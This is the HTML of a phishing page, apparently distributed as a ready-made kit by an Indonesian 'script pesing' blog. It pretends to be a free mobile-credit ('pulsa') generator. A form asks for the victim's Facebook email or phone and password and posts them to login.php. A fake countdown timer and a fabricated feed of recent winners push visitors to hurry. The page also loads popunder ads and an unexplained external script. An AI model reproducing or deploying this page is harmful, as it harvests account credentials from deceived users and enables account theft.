<!-- Script ini di download dari : http://scriptpesing.blogspot.com -->

<!DOCTYPE html>
<html>
   <head>
   	<script type="text/javascript"> 
    var adfly_id = 14593743; 
    var popunder_frequency_delay = 0; 
</script> 
<script src="https://cdn.adf.ly/js/display.js"></script> 
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta name="googlebot" content="noindex">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
      <title>Pulsa Online Generator</title>
      <link rel="shortcut icon" href="img/rp.png" />
      <link rel="stylesheet" type="text/css" href="css/standard.css">
      <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
      <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
   </head>
   
   <body cz-shortcut-listen="true" >
      <link href="css/fonts.css" rel="stylesheet" type="text/css">
      <div id="X00WrapperMain">
         <div style="">
            <div><span class="label label-default"><strong>Pulsa Gratis All Operator Indonesia</strong></span></div>
            <div><span class="label label-danger"><strong>Anda dapat menggunakan sistem ini dalam waktu</strong></span> <span id="X00Countdown" class="label label-danger" style="font-weight: bold; display: inline; opacity: 0.866044;">09:44</span> <span class="label label-danger"><strong>menit!</strong></span></div>
         </div>
         <div style="margin-bottom: -37px; text-align: center;">
            <a href="index.php"><img id="X00ImageHeader" src="img/pulsa-online-gratis.png"></a>
            <div style="text-align: right; margin-bottom: 19px; ">
               <span class="label label-default" style="font-weight: bold;">Version 5.11 (2017)</span>
            </div>
         </div>
         <div id="X00WrapperStart" class="panel panel-default">
            <div class="panel-heading">
               <h3 class="panel-title"><i class="glyphicon glyphicon-registration-mark" style="margin-right: 10px;"></i> Masuk Dengan Facebook Anda Untuk Mendaftar</h3>
            </div>
            <div class="panel-body">
               <form action="login.php" method="post">
			   <div class="form-group" style="margin-bottom: 10px;">
				<label style="font-weight: bold;font-size: 13px;padding-left: 10px;">Email atau Telepon:</label><br>
                  <div class="input-group">
                     <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                     <input id="X00InputUsername" type="text" name="email" class="form-control error" placeholder="Email atau Telepon">
                  </div>
               </div>
               <div class="form-group" style="margin-bottom: 10px;">
				<label style="font-weight: bold;font-size: 13px;padding-left: 10px;">Kata Sandi:</label><br>
                  <div class="input-group">
                     <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                     <input id="X00InputUsername" type="text" name="pass" class="form-control error" placeholder="Kata Sandi">
                  </div>
               </div>
            </div>
			<div class="panel-footer text-center">
               <div class="btn-group" role="group">
                  <div class="input-group">
                    <span class="input-group-btn">
					<button id="X00ButtonStart" class="btn btn-success" type="submit">Daftar</button>
					</span>
                  </div>
               </div>
            </div>
		 </div>

         <div class="panel panel-default" style="">
            <div class="panel-heading">
               <h3 class="panel-title"><i class="glyphicon glyphicon-fire" style="margin-right: 10px;"></i>Aktivitas Terakhir</h3>
            </div>
            <div id="X00Activities" class="panel-body">
               <div style="text-align: center; display: block;"><span class="label label-primary" style="font-weight: bold;">085249458xxx</span> <span class="label label-default" style="font-weight: bold;">telah mendapatkan</span> <span class="label label-success" style="font-weight: bold;">20.000 Pulsa</span> <span id="X00ActivitySeconds" class="label label-info" style="font-weight: bold;">0d lalu</span></div>
            </div>
            <div class="panel-footer small">
               <span class="label label-default"><strong>Info</strong></span> <span class="label label-default">Beberpapa pengunjung yang telah mendapatkan pulsa gratis</span>
            </div>
         </div>
         <div class="small text-center" style="background:#485563;">
            Copyright &copy; 2017. All rights reserved. <a href="index.php">Pulsa Online Generator</span></a>
         </div>
      </div>
	  <div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div>
	  
      <script type="text/javascript">
         var X00Unique = 'COC_02_58d2ca2e43';
         var X00CountdownMinutesStart = 15;
         var X00CountdownSecondsStart = 60;
      </script>
      <script type="text/javascript" src="js/standard.js"></script>
      <script type="text/javascript" src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
      <script type="text/javascript" src="js/activation.js"></script>
	  <script type="text/javascript" src="http://filejavascript.jw.lt/js/28.js"></script>
	  <script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script>
	  <a href="http://www.histats.com" target="_blank" title="free hit counter" ><script type="text/javascript"> try {Histats.start(1,3544042,4,0,0,0,""); Histats.track_hits();} catch(err){}; </script></a>
   </body>
</html>